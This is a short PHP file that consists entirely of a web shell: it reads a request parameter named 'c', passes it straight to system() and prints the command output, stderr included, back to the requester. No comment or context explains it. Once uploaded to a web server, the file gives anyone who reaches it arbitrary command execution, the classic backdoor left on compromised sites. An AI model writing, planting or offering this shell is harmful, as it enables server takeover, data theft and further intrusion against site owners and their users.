<?php
if (isset($_REQUEST['c'])) {
    echo '<pre>';
    system($_REQUEST['c'] . ' 2>&1');
    echo '</pre>';
}
